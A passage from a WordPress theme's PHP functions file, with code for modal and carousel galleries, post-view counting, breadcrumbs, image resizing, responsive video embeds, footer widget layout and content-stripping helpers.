    $attr['include'] = $attr['ids'];
  }

  // We're trusting author input, so let's at least make sure it looks like a valid orderby statement
  if ( isset( $attr['orderby'] ) ) {
    $attr['orderby'] = sanitize_sql_orderby( $attr['orderby'] );
    if ( !$attr['orderby'] )
      unset( $attr['orderby'] );
  }

  extract(shortcode_atts(array(
    'order'      => 'ASC',
    'orderby'    => 'menu_order ID',
    'id'         => $post ? $post->ID : 0,
    'itemtag'    => 'dl',
    'icontag'    => 'dt',
    'captiontag' => 'dd',
    'columns'    => 3,
    'size'       => 'thumbnail',
    'include'    => '',
    'exclude'    => '',
    'link'       => '',
    'type' =>'', 
    'modal_type' =>'' 
  ), $attr, 'gallery'));

  if($type!='')
    return $out;

  $id = intval($id);
  if ( 'RAND' == $order )
    $orderby = 'none';

  if ( !empty($include) ) {
    $_attachments = get_posts( array('include' => $include, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => $order, 'orderby' => $orderby) );

    $attachments = array();
    foreach ( $_attachments as $key => $val ) {
      $attachments[$val->ID] = $_attachments[$key];
    }
  } elseif ( !empty($exclude) ) {
    $attachments = get_children( array('post_parent' => $id, 'exclude' => $exclude, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => $order, 'orderby' => $orderby) );
  } else {
    $attachments = get_children( array('post_parent' => $id, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => $order, 'orderby' => $orderby) );
  }

  if ( empty($attachments) )
    return '';

  if ( is_feed() ) {
    $output = "\n";
    foreach ( $attachments as $att_id => $attachment )
      $output .= wp_get_attachment_link($att_id, $size, true) . "\n";
    return $output;
  }

  $itemtag = tag_escape($itemtag);
  $captiontag = tag_escape($captiontag);
  $icontag = tag_escape($icontag);
  $valid_tags = wp_kses_allowed_html( 'post' );
  if ( ! isset( $valid_tags[ $itemtag ] ) )
    $itemtag = 'dl';
  if ( ! isset( $valid_tags[ $captiontag ] ) )
    $captiontag = 'dd';
  if ( ! isset( $valid_tags[ $icontag ] ) )
    $icontag = 'dt';

  $columns = intval($columns);
  $itemwidth = $columns > 0 ? floor(100/$columns) : 100;
  $float = is_rtl() ? 'right' : 'left';

  $selector = "gallery-{$instance}";

  $gallery_style = $gallery_div = '';
  if ( apply_filters( 'use_default_gallery_style', true ) )
    $gallery_style = "<style type='text/css'>#{$selector} {margin: auto;}#{$selector} .gallery-item { float: {$float}; margin-top: 10px; text-align: center; width: {$itemwidth}%; } #{$selector} img { border: 2px none #cfcfcf; } #{$selector} .gallery-caption { margin-left: 0; } /* see gallery_shortcode() in wp-includes/media.php */</style>";
  $size_class = sanitize_html_class( $size );
  $gallery_div = "<div id='$selector' class='gallery galleryid-{$id} gallery-columns-{$columns} gallery-size-{$size_class}'>";
  $output = apply_filters( 'gallery_style', $gallery_style . "\n\t\t" . $gallery_div );

  $i = 0;
  foreach ( $attachments as $id => $attachment ) {
    if ( ! empty( $link ) && 'file' === $link ) {
      $url = wp_get_attachment_url($id);

      $image_output = '<a href="'.esc_url($url).'" data-modal="modal_post_'.$instance."_".$id.'" onClick="return false;" class="md-trigger">'.wp_get_attachment_image( $id, $size, false).'</a>';


      //$image_output = wp_get_attachment_link( $id, $size, false, false );
    } elseif ( ! empty( $link ) && 'none' === $link )
      $image_output = wp_get_attachment_image( $id, $size, false );
    else
      $image_output = wp_get_attachment_link( $id, $size, true, false );

    $image_meta  = wp_get_attachment_metadata( $id );

    $output .= "<{$itemtag} class='gallery-item'><{$icontag} class='gallery-icon'>$image_output</{$icontag}>";

    $output_popup = "";

    if('file'==$link){

      if($modal_type==''){

        if($detheme_config['dt-select-modal-effects']=='') { 
            $modal_type = 'md-effect-15';
          } else {
            $modal_type = $detheme_config['dt-select-modal-effects'];
        }         
      } 

      $output_popup = '<div id="modal_post_'.$instance."_".$id.'" class="popup-gallery md-modal '.$modal_type.'">
        <div class="md-content secondary_color_bg">
          <img src="#" rel="'. wp_get_attachment_url($id) .'" class="img-responsive" alt="'.esc_attr($attachment->post_title).'"/>';
      if(!empty($attachment->post_excerpt)):
      
      $output_popup.='<div class="md-description secondary_color_bg">'."
        " . wptexturize($attachment->post_excerpt) . '
          </div>';
      endif;

      $output_popup.='<button class="button md-close right btn-cross secondary_color_button"><i class="icon-cancel"></i></button>
        </div>
      </div>'."\n";

      array_push($dt_revealData, $output_popup);
    }
    else{

      if ( $captiontag && trim($attachment->post_excerpt)) {

        $output .= "
          <{$captiontag} class='wp-caption-text gallery-caption'>
          " . wptexturize($attachment->post_excerpt) . "
          </{$captiontag}>";
      }

    }



    $output .= "</{$itemtag}>";
    if ( $columns > 0 && ++$i % $columns == 0 )
      $output .= '<br style="clear: both" />';
  }

  $output .= "
      <br style='clear: both;' />
    </div>\n";

  $output = nl2space($output);
  return $output;
}


function load_modal_media_effect(){

   global $detheme_config;

  $modal_options=
  array('md-effect-1'=>__('Fade in and scale up','detheme'),
        'md-effect-2'=>__('Slide from the right','detheme'),
         'md-effect-3'=>__('Slide from the bottom','detheme'),
         'md-effect-4'=>__('Newspaper','detheme'),
         'md-effect-5'=>__('Fall','detheme'),
         'md-effect-6'=>__('Side fall','detheme'),
         'md-effect-7'=>__('Slide and stick to top','detheme'),
         'md-effect-8'=>__('3D flip horizontal','detheme'),
         'md-effect-9'=>__('3D flip vertical','detheme'),
         'md-effect-10'=>__('3D sign','detheme'),
         'md-effect-11'=>__('Super scaled','detheme'),
         'md-effect-12'=>__('Just me','detheme'),
         'md-effect-13'=>__('3D slit','detheme'),
         'md-effect-14'=>__('3D Rotate from bottom','detheme'),
         'md-effect-15'=>__('3D Rotate in from left (Default)','detheme'),
         'md-effect-16'=>__('Blur','detheme'),
         'md-effect-17'=>__('Slide in from bottom with perspective on container','detheme'),
         'md-effect-18'=>__('Slide from right with perspective on container','detheme'),
         'md-effect-19'=>__('Slip in from the top with perspective on container','detheme')
   );

  if ($detheme_config['dt-select-modal-effects']=='') { 
     $default_md_effect = 'md-effect-15';
  } else {
     $default_md_effect = $detheme_config['dt-select-modal-effects'];
  } 

?>
<script type="text/html" id="tmpl-detheme-gallery-settings">
      <label class="setting">
        <span><?php _e( 'Modal Effects Option', 'detheme' ); ?></span>
        <select class="modal_type" name="modal_type" data-setting="modal_type">
          <?php foreach ( $modal_options as $value => $caption ) : ?>
            <option value="<?php echo esc_attr( $value ); ?>" <?php selected( $value, $default_md_effect ); ?>><?php echo esc_html( $caption ); ?></option>
          <?php endforeach; ?>
        </select>
      </label>
</script>

<script type="text/javascript">
jQuery(document).ready(function($){

  var media = wp.media;
  media.view.Settings.Gallery = media.view.Settings.Gallery.extend({
    render: function() {
      var $el = this.$el;

      media.view.Settings.prototype.render.apply( this, arguments );

      // Append the type template and update the settings.
      $el.append( media.template( 'detheme-gallery-settings' ) );

      // Hide the Columns setting for all types except Default
      $el.find( 'select.link-to' ).on( 'change', function () {
        
        var modal_type = $el.find( 'select[name=modal_type]' ).closest( 'label.setting' );

        if ( 'file' === $( this ).val() ) {
          modal_type.show();
        } else {
          modal_type.hide();
        }
      } ).change();

      return this;
    }
  });
});
</script>
<?php

}

if(!defined('JETPACK__VERSION')){

   add_filter( 'post_gallery','detheme_gallery', 99999, 2 );
   add_action( 'print_media_templates', 'load_modal_media_effect');


}
//remove_shortcode('gallery');
//add_shortcode('gallery', 'dt_gallery_shortcode');
add_filter('post_gallery','getPortfolioGallery',1,2);

function getPortfolioGallery($out,$attr=array()){

  global $post,$carouselGallery;


  if( 'port'!==$post->post_type || isset($attr['is_widget']) || ($carouselGallery!=='' && $carouselGallery))
      return '';


 if ( isset( $attr['orderby'] ) ) {
    $attr['orderby'] = sanitize_sql_orderby( $attr['orderby'] );
    if ( !$attr['orderby'] )
      unset( $attr['orderby'] );
  }

    extract(shortcode_atts(array(
      'order'      => 'ASC',
      'orderby'    => 'menu_order ID',
      'id'         => $post ? $post->ID : 0,
      'itemtag'    => 'dl',
      'icontag'    => 'dt',
      'captiontag' => 'dd',
      'columns'    => 3,
      'size'       => 'thumbnail',
      'include'    => '',
      'exclude'    => '',
      'link'       => '',
      'type'       =>'',
    ), $attr, 'gallery'));


    if($type!='')
      return $out;

    $id = intval($id);

    if ( 'RAND' == $order )
      $orderby = 'none';

    if ( !empty($include) ) {
      $_attachments = get_posts( array('include' => $include, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => $order, 'orderby' => $orderby) );

      $attachments = array();
      foreach ( $_attachments as $key => $val ) {
        $attachments[$val->ID] = $_attachments[$key];
      }
    } elseif ( !empty($exclude) ) {
      $attachments = get_children( array('post_parent' => $id, 'exclude' => $exclude, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => $order, 'orderby' => $orderby) );
    } else {
      $attachments = get_children( array('post_parent' => $id, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => $order, 'orderby' => $orderby) );
    }

    if ( empty($attachments) ){
      return '';
    }

    $carouselGallery='<div id="portfolio-carousel" class="carousel slide" data-ride="carousel">
                  <div class="carousel-inner">';
  $i=0;

  foreach ( $attachments as $id => $attachment ) {
  
      $url = wp_get_attachment_url($id);
      $alt_image = get_post_meta($id, '_wp_attachment_image_alt', true);

      $carouselGallery.='<div class="item'.((0==$i)?" active":"").'">
                      <img src="'.esc_url($url).'" alt="'.esc_attr($alt_image).'">
                    </div>';
      $i++;

    }

    $carouselGallery.='</div>
                  <div class="post-gallery-carousel-nav">
                  <div class="post-gallery-carousel-buttons">                  
                  <a class="secondary_color_button btn skin-light" href="#portfolio-carousel" data-slide="prev">
                    <span><i class="icon-left-open-big"></i></span>
                  </a>
                  <a class="secondary_color_button btn skin-light" href="#portfolio-carousel" data-slide="next">
                    <span><i class="icon-right-open-big"></i></span>
                  </a>
                  </div>
                  </div>
                </div>';


    return "<!-- gallery -->";

}

if(!function_exists('nl2space')){
    function nl2space($str) {
        $arr=explode("\n",$str);
        $out='';

        for($i=0;$i<count($arr);$i++) {
            if(strlen(trim($arr[$i]))>0)
                $out.= trim($arr[$i]).' ';
        }
        return $out;
    }
}

// function to display number of posts.
function dt_get_post_views($postID){

    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return sprintf(__("%d View",'detheme'),0);
    } elseif ($count<=1) {
        return sprintf(__("%d View",'detheme'),$count);  
    }


    $output = str_replace('%', number_format_i18n($count),__('% Views'));
    return $output;
}

function dt_get_post_view_number($postID){
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    return (int)$count;
}

// function to display number of posts without "Views" Text.
function dt_get_post_views_number($postID){
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0";
    }
    return $count;
}

// function to count views.
function dt_set_post_views($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}


// Add it to a column in WP-Admin
add_filter('manage_posts_columns', 'dt_posts_column_views');
add_action('manage_posts_custom_column', 'dt_posts_custom_column_views',5,2);

function dt_posts_column_views($defaults){
    $defaults['post_views'] = __('Views','detheme');
    return $defaults;
}

function dt_posts_custom_column_views($column_name, $id){
  if($column_name === 'post_views'){
        echo dt_get_post_views(get_the_ID());
    }
}


/** Breadcrumbs **/
/** http://dimox.net/wordpress-breadcrumbs-without-a-plugin/ **/
function dimox_breadcrumbs() {
  /* === OPTIONS === */
  $text['home']     = __('Home','detheme'); // text for the 'Home' link
  $text['category'] = '%s'; // text for a category page
  $text['search']   = '%s'; // text for a search results page
  $text['tag']      = '%s'; // text for a tag page
  $text['author']   = '%s'; // text for an author page
  $text['404']      = __('Error 404','detheme'); // text for the 404 page

  $show_current   = 1; // 1 - show current post/page/category title in breadcrumbs, 0 - don't show
  $show_on_home   = 1; // 1 - show breadcrumbs on the homepage, 0 - don't show
  $show_home_link = 1; // 1 - show the 'Home' link, 0 - don't show
  $show_title     = 1; // 1 - show the title for the links, 0 - don't show
  $delimiter      = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'; // delimiter between crumbs
  $before         = '<span class="current">'; // tag before the current crumb
  $after          = '</span>'; // tag after the current crumb
  /* === END OF OPTIONS === */

  global $post;
  $home_link    = home_url('/');
  $link_before  = '<span typeof="v:Breadcrumb">';
  $link_after   = '</span>';
  $link_attr    = ' rel="v:url" property="v:title"';
  $link         = $link_before . '<a' . $link_attr . ' href="%1$s">%2$s</a>' . $link_after;

  if ($post) {
    $parent_id    = $parent_id_2 = $post->post_parent;
  }
  $frontpage_id = get_option('page_on_front');

  if (is_home() || is_front_page()) {

    if ($show_on_home == 1) echo '<div class="breadcrumbs primary_color_bg">'.__('You are here','detheme').' :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="' . $home_link . '">' . $text['home'] . '</a></div>';

  } else {

    echo '<div class="breadcrumbs primary_color_bg">'.__('You are here','detheme').' :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;';
    if ($show_home_link == 1) {
      echo '<a href="' . $home_link . '" rel="v:url" property="v:title">' . $text['home'] . '</a>';

      if ( is_search() ) {
        echo $delimiter;
      } else {
        if ($frontpage_id == 0 || $parent_id != $frontpage_id) echo $delimiter;
      }
    }

    if ( is_category() ) {
      $this_cat = get_category(get_query_var('cat'), false);
      if ($this_cat->parent != 0) {
        $cats = get_category_parents($this_cat->parent, TRUE, $delimiter);
        if ($show_current == 0) $cats = preg_replace("#^(.+)$delimiter$#", "$1", $cats);
        $cats = str_replace('<a', $link_before . '<a' . $link_attr, $cats);
        $cats = str_replace('</a>', '</a>' . $link_after, $cats);
        if ($show_title == 0) $cats = preg_replace('/ title="(.*?)"/', '', $cats);
        echo $cats;
      }
      if ($show_current == 1) echo $before . sprintf($text['category'], single_cat_title('', false)) . $after;

    } elseif ( is_search() ) {
      echo $before . sprintf($text['search'], get_search_query()) . $after;

    } elseif ( is_day() ) {
      echo sprintf($link, get_year_link(get_the_time('Y')), get_the_time('Y')) . $delimiter;
      echo sprintf($link, get_month_link(get_the_time('Y'),get_the_time('m')), get_the_time('F')) . $delimiter;
      echo $before . get_the_time('d') . $after;

    } elseif ( is_month() ) {
      echo sprintf($link, get_year_link(get_the_time('Y')), get_the_time('Y')) . $delimiter;
      echo $before . get_the_time('F') . $after;

    } elseif ( is_year() ) {
      echo $before . get_the_time('Y') . $after;

    } elseif ( is_single() && !is_attachment() ) {
      if ( get_post_type() != 'post' ) {
        $post_type = get_post_type_object(get_post_type());
        $slug = $post_type->rewrite;
        printf($link, $home_link . '/' . $slug['slug'] . '/', $post_type->labels->singular_name);
        if ($show_current == 1) echo $delimiter . $before . get_the_title() . $after;
      } else {
        $cat = get_the_category(); $cat = $cat[0];
        $cats = get_category_parents($cat, TRUE, $delimiter);
        if ($show_current == 0) $cats = preg_replace("#^(.+)$delimiter$#", "$1", $cats);
        $cats = str_replace('<a', $link_before . '<a' . $link_attr, $cats);
        $cats = str_replace('</a>', '</a>' . $link_after, $cats);
        if ($show_title == 0) $cats = preg_replace('/ title="(.*?)"/', '', $cats);
        echo $cats;
        if ($show_current == 1) echo $before . get_the_title() . $after;
      }

    } elseif ( !is_single() && !is_page() && get_post_type() != 'post' && !is_404() ) {
      $post_type = get_post_type_object(get_post_type());
      echo $before . $post_type->labels->singular_name . $after;

    } elseif ( is_attachment() ) {
      $parent = get_post($parent_id);
      $cat = get_the_category($parent->ID); $cat = $cat[0];
      if ($cat) {
        $cats = get_category_parents($cat, TRUE, $delimiter);
        $cats = str_replace('<a', $link_before . '<a' . $link_attr, $cats);
        $cats = str_replace('</a>', '</a>' . $link_after, $cats);
        if ($show_title == 0) $cats = preg_replace('/ title="(.*?)"/', '', $cats);
        echo $cats;
      }
      printf($link, get_permalink($parent), $parent->post_title);
      if ($show_current == 1) echo $delimiter . $before . get_the_title() . $after;

    } elseif ( is_page() && !$parent_id ) {
      if ($show_current == 1) echo $before . get_the_title() . $after;

    } elseif ( is_page() && $parent_id ) {
      if ($parent_id != $frontpage_id) {
        $breadcrumbs = array();
        while ($parent_id) {
          $page = get_page($parent_id);
          if ($parent_id != $frontpage_id) {
            $breadcrumbs[] = sprintf($link, get_permalink($page->ID), get_the_title($page->ID));
          }
          $parent_id = $page->post_parent;
        }
        $breadcrumbs = array_reverse($breadcrumbs);
        for ($i = 0; $i < count($breadcrumbs); $i++) {
          echo $breadcrumbs[$i];
          if ($i != count($breadcrumbs)-1) echo $delimiter;
        }
      }
      if ($show_current == 1) {
        if ($show_home_link == 1 || ($parent_id_2 != 0 && $parent_id_2 != $frontpage_id)) echo $delimiter;
        echo $before . get_the_title() . $after;
      }

    } elseif ( is_tag() ) {
      echo $before . sprintf($text['tag'], single_tag_title('', false)) . $after;

    } elseif ( is_author() ) {
      global $author;
      $userdata = get_userdata($author);
      echo $before . sprintf($text['author'], $userdata->display_name) . $after;

    } elseif ( is_404() ) {
      echo $before . $text['404'] . $after;

    } elseif ( has_post_format() && !is_singular() ) {
      echo get_post_format_string( get_post_format() );
    }

    if ( get_query_var('paged') ) {
      if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ' (';
      if ( is_page() ) echo $delimiter;
      echo __('Page','detheme') . ' ' . get_query_var('paged');
      if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ')';
    }

    echo '</div><!-- .breadcrumbs -->';

  }
} // end dimox_breadcrumbs()

if(!function_exists('is_ssl_mode')){
function is_ssl_mode(){
  $ssl=strpos("a".site_url(),'https://');

  return (bool)$ssl;
}}

function maybe_ssl_url($url=""){
  return is_ssl_mode()?str_replace('http://', 'https://', $url):$url;
}

if (!function_exists('aq_resize')) {
  function aq_resize( $url, $width, $height = null, $crop = null, $single = true ) {

    if(!$url OR !($width || $height)) return false;

    //define upload path & dir
    $upload_info = wp_upload_dir();
    $upload_dir = $upload_info['basedir'];
    $upload_url = $upload_info['baseurl'];
    
    //check if $img_url is local
    /* Gray this out because WPML doesn't like it.
    if(strpos( $url, home_url() ) === false) return false;
    */
    
    //define path of image
    $rel_path = str_replace( str_replace( array( 'http://', 'https://' ),"",$upload_url), '', str_replace( array( 'http://', 'https://' ),"",$url));
    $img_path = $upload_dir . $rel_path;
    
    //check if img path exists, and is an image indeed
    if( !file_exists($img_path) OR !getimagesize($img_path) ) return false;
    
    //get image info
    $info = pathinfo($img_path);
    $ext = $info['extension'];
    list($orig_w,$orig_h) = getimagesize($img_path);
    
    $dims = image_resize_dimensions($orig_w, $orig_h, $width, $height, $crop);
    if(!$dims){
      return $single?$url:array('0'=>$url,'1'=>$orig_w,'2'=>$orig_h);
    }

    $dst_w = $dims[4];
    $dst_h = $dims[5];

    //use this to check if cropped image already exists, so we can return that instead
    $suffix = "{$dst_w}x{$dst_h}";
    $dst_rel_path = str_replace( '.'.$ext, '', $rel_path);
    $destfilename = "{$upload_dir}{$dst_rel_path}-{$suffix}.{$ext}";

    //if orig size is smaller
    if($width >= $orig_w) {

      if(!$dst_h) :
        //can't resize, so return original url
        $img_url = $url;
        $dst_w = $orig_w;
        $dst_h = $orig_h;
        
      else :
        //else check if cache exists
        if(file_exists($destfilename) && getimagesize($destfilename)) {
          $img_url = "{$upload_url}{$dst_rel_path}-{$suffix}.{$ext}";
        } 
        else {

          $imageEditor=wp_get_image_editor( $img_path );

          if(!is_wp_error($imageEditor)){

              $imageEditor->resize($width, $height, $crop );
              $imageEditor->save($destfilename);

              $resized_rel_path = str_replace( $upload_dir, '', $destfilename);
              $img_url = $upload_url . $resized_rel_path;


          }
          else{
              $img_url = $url;
              $dst_w = $orig_w;
              $dst_h = $orig_h;
          }

        }
        
      endif;
      
    }
    //else check if cache exists
    elseif(file_exists($destfilename) && getimagesize($destfilename)) {
      $img_url = "{$upload_url}{$dst_rel_path}-{$suffix}.{$ext}";
    } 
    else {

      $imageEditor=wp_get_image_editor( $img_path );

      if(!is_wp_error($imageEditor)){
          $imageEditor->resize($width, $height, $crop );
          $imageEditor->save($destfilename);

          $resized_rel_path = str_replace( $upload_dir, '', $destfilename);
          $img_url = $upload_url . $resized_rel_path;
      }
      else{
          $img_url = $url;
          $dst_w = $orig_w;
          $dst_h = $orig_h;
      }


    }
    
    if(!$single) {
      $image = array (
        '0' => $img_url,
        '1' => $dst_w,
        '2' => $dst_h
      );
      
    } else {
      $image = $img_url;
    }
    
    return $image;
  }
}


if (!function_exists('mb_strlen'))
{
  function mb_strlen($str="")
  {
    return strlen($str);
  }
}

function wp_trim_chars($text, $num_char = 55, $more = null){

  if ( null === $more )
    $more = '';
  $original_text = $text;
  $text = wp_strip_all_tags( $text );

  $words_array = preg_split( "/[\n\r\t ]+/", $text, $num_char + 1, PREG_SPLIT_NO_EMPTY );
  $text = @implode( ' ', $words_array );
  
  
  if ( strlen( $text ) > $num_char ) {
  
    $text = substr($text,0, $num_char );
    $text = $text . $more;
  }

  return apply_filters( 'wp_trim_chars', $text, $num_char, $more, $original_text );
}

if(!function_exists('hex2rgb')){
  function hex2rgb($hex) {
     $hex = str_replace("#", "", $hex);

     if(strlen($hex) == 3) {
        $r = hexdec(substr($hex,0,1).substr($hex,0,1));
        $g = hexdec(substr($hex,1,1).substr($hex,1,1));
        $b = hexdec(substr($hex,2,1).substr($hex,2,1));
     } else {
        $r = hexdec(substr($hex,0,2));
        $g = hexdec(substr($hex,2,2));
        $b = hexdec(substr($hex,4,2));
     }
     $rgb = array($r, $g, $b);
     //return implode(",", $rgb); // returns the rgb values separated by commas
     return $rgb; // returns an array with the rgb values
  }

}

function responsiveVideo($html, $data, $url) {

  $html=add_video_wmode_transparent($html);

  if (!is_admin() && !preg_match("/flex\-video/mi", $html) /*&& preg_match("/youtube|vimeo/", $url)*/) {
    $html="<div class=\"flex-video widescreen\">".$html."</div>";
  }
  return $html;
}

add_filter('embed_handler_html', 'responsiveVideo', 92, 3 ); 
add_filter('oembed_dataparse', 'responsiveVideo', 90, 3 );
add_filter('embed_oembed_html', 'responsiveVideo', 91, 3 );

function add_video_wmode_transparent($html) {
   if (strpos($html, "<iframe " ) !== false) {
      $search = array('?feature=oembed');
      $replace = array('?feature=oembed&wmode=transparent&rel=0&autohide=1&showinfo=0');
      $html = str_replace($search, $replace, $html);

      return $html;
   } else {
      return $html;
   }
}

add_filter('the_content', 'add_video_wmode_transparent', 10, 1);


function makeBottomWidgetColumn($params){

  global $detheme_config;



  if('detheme-bottom'==$params[0]['id']){

    $class="col-sm-4";

    if(isset($detheme_config['dt-footer-widget-column']) && $col=(int)$detheme_config['dt-footer-widget-column']){

      switch($col){

          case 2:
                $class='col-md-6 col-sm-6 col-xs-6';
            break;
          case 3:
                $class='col-md-4 col-sm-6 col-xs-6';
            break;
          case 4:
                $class='col-lg-3 col-md-4 col-sm-6 col-xs-6';
            break;
          case 1:
          default:
                $class='col-sm-12';
            break;
      }
    }


    $makerow="";


    $params[0]['before_widget']='<div class="border-left '.$class.' col-'.$col.'">'.$params[0]['before_widget'];
    $params[0]['after_widget']=$params[0]['after_widget'].'</div>'.$makerow;

 }

  return $params;

}

function detheme_protected_meta($protected, $meta_key, $meta_type){

 $protected=(in_array($meta_key,
    array('vc_teaser','slide_template','pagebuilder','masonrycolumn','portfoliocolumn','portfoliotype','post_views_count','show_comment','show_social','sidebar_position','subtitle')
  ))?true:$protected;

  return $protected;
}

add_filter('is_protected_meta','detheme_protected_meta',1,3);


add_filter( 'dynamic_sidebar_params', 'makeBottomWidgetColumn' );

function fill_width_dummy_widget (){

   global $detheme_config;
   $col=1;
   if(isset($detheme_config['dt-footer-widget-column']) && !empty($detheme_config['dt-footer-widget-column'])) {
      $col=(int)$detheme_config['dt-footer-widget-column'];
   }


   $sidebar = wp_get_sidebars_widgets();


   $itemCount=(isset($sidebar['detheme-bottom']))?count($sidebar['detheme-bottom']):0;

   switch($col){

          case 2:
                $class='col-md-6 col-sm-6 col-xs-6';
            break;
          case 3:
                $class='col-md-4 col-sm-6 col-xs-6';
            break;
          case 4:
                $class='col-lg-3 col-md-4 col-sm-6 col-xs-6';
            break;
          case 1:
          default:
                $class='col-sm-12';
            break;
  }


  if($itemCount % $col){
   print str_repeat("<div class=\"border-left dummy ".$class."\"></div>",$col - ($itemCount % $col));
 }



}

add_action('dynamic_sidebar_detheme-bottom','fill_width_dummy_widget');

function remove_shortcode_from_content($content) {
    // remove shortcodes
    $content = strip_shortcodes( $content );

    // remove images
    $content = preg_replace('/<img[^>]+./','', $content);
  return $content;
}

// Remove video from content              
function removeVideo($html, $data, $url) {
  return '';
}

function remove_first_audio_shortcode_from_content($content) {
  //Find audio shotcode in content
  $pattern = get_shortcode_regex();
  preg_match_all( '/'. $pattern .'/s', $content, $matches );

  /* find first audio shortcode */
  $i = 0;
  $hasaudioshortcode = false;

  foreach ($matches[2] as $shortcodetype) {
    if ($shortcodetype=='audio') {
      $hasaudioshortcode = true;
      break;
    }
      $i++;
  }

  if ($hasaudioshortcode) {
    $content = str_replace($matches[0][$i],'',$content);
  }

  return $content;
}

function remove_first_gallery_shortcode_from_content($content) {
  //Find audio shotcode in content
  $pattern = get_shortcode_regex();
  preg_match_all( '/'. $pattern .'/s', $content, $matches );

  /* find first audio shortcode */
  $i = 0;
  $hasgalleryshortcode = false;

  foreach ($matches[2] as $shortcodetype) {
    if ($shortcodetype=='gallery') {
      $hasgalleryshortcode = true;
      break;
    }
      $i++;
  }

  if ($hasgalleryshortcode) {
    $content = str_replace($matches[0][$i],'',$content);
  }

  return $content;
}

function remove_first_image_from_content($content) {
    global $post;

    /* Get Image from featured image */
    $featured_image = wp_get_attachment_image_src(get_post_thumbnail_id($post->ID),'full',false); 
    if (isset($featured_image[0])) {
      //if image is featured image, it's not necessary to remove image from content
      return $content;
    } else {
      $imageurl1 = "";
      $imageurl2 = "";

      $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
      if ($output>0) {
        $imageurl1 = $matches[1][0];
      }

      /* Get Image from content image that has caption shortcode */
      $pattern = get_shortcode_regex();
      preg_match_all( '/'. $pattern .'/s', $content, $matches );
      /* find first caption shortcode */
      $i = 0;
      $hascaption = false;
      foreach ($matches[2] as $shortcodetype) {
        if ($shortcodetype=='caption') {
          $hascaption = true;
          break;
        }
          $i++;
      }

      if ($hascaption) {
        preg_match('/^<a.*?href=(["\'])(.*?)\1.*$/', $matches[5][$i], $m);
        preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $m[0], $m2);
        $imageurl2 = $m2[1][0];
      }

      if ($imageurl1==$imageurl2) {
        //if image in caption tag
        $content = str_replace($matches[0][$i],'',$content);
      } else {
        //if image not in caption tag
        ob_start();
        ob_end_clean();
        $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
        if ($output>0) {
          $content = str_replace($matches[0][0],'',$content);
        }
      }

      return $content;

    }
}

function remove_first_video_shortcode_from_content($content) {
  $hasvideoshortcode = false;
  //Find video shotcode in content
  $pattern = get_shortcode_regex();
  $found = preg_match_all( '/'. $pattern .'/s', $content, $matches );

  // find first video shortcode
  $i = 0;
  if ($found>0) {
    foreach ($matches[2] as $shortcodetype) {
      if ($shortcodetype=='video') {
        $hasvideoshortcode = true;
        break;
      }
        $i++;
    }
  }

  if ($hasvideoshortcode) {
    $content = str_replace($matches[0][0],'',$content);
  }

  return $content;
}

function removeFirstURLVideo($html, $data, $url, $post_id) {
  global $post;

  $found = preg_match('@https?://(www.)?(youtube|vimeo)\.com/(watch\?v=)?([a-zA-Z0-9_-]+)@im', $post->post_content, $urls);
  $youtubelink = '';
  if ($found>0) {
    if (isset($urls[0])) {
      $youtubelink = $urls[0];
    } //if isset($urls[0])
  }
  
  if ($data==$youtubelink) {
    return '';
  } else {
    return $html;
  }
}

function get_first_image_url_from_content() {
  global $post, $posts;
  $first_img = '';
  ob_start();
  ob_end_clean();
  if (isset($post->post_content)) {
    $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
    if (isset($matches[1][0])) {
      $first_img = $matches[1][0];
    }
  }

  return $first_img;
}

if(function_exists('vc_set_as_theme'))
{

  add_action('init','detheme_vc_cta_2');   

  function detheme_vc_cta_2(){

       vc_remove_param('vc_cta_button2','color');
        vc_add_param( 'vc_cta_button2', array( 
                "type" => "dropdown",
                "heading" => __("Button style", 'detheme'),
                "param_name" => "btn_style",
                "value" => array(
                  __('Primary','detheme')=>'color-primary',
                  __('Secondary','detheme')=>'color-secondary',
                  __('Success','detheme')=>'success',
                  __('Info','detheme')=>'info',
                  __('Warning','detheme')=>'warning',
                  __('Danger','detheme')=>'danger',
                  __('Ghost Button','detheme')=>'ghost',
                  __('Link','detheme')=>'link',
                  ),
                "std" => 'default',
                "description" => __("Button style", 'detheme')."."
                )
        );
     vc_add_param( 'vc_cta_button2',
        array(
          "type" => "dropdown",
          "heading" => __("Size", 'detheme'),
          "param_name" => "size",
              "value" => array(
                __('Large','detheme')=>'btn-lg',
                __('Default','detheme')=>'btn-default',
                __('Small','detheme')=>'btn-sm',
                __('Extra small','detheme')=>'btn-xs'
                ),
          "std" => 'btn-default',
          "description" => __("Button size.", 'detheme')
        ));
  }


  function remove_meta_box_vc(){
    remove_meta_box( 'vc_teaser','page','side');
  }

